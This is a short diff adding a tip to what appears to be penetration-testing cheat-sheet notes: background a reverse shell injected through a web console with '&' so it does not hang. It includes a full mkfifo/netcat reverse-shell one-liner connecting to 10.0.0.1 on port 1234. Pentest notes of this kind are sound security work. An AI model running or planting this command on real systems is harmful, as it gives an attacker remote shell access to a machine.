@@ -94,5 +94,15 @@ or run the exploit again
 which nc
 ```
 
+## Makes Sure shells don't hang \(send to background\)
+
+```
+If adding a reverse shell to web console for example, add a "&" to the end of reverse shell, to send to background
+and in case any process during interaction hangs
+for example:
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f &
+```
+
 
 
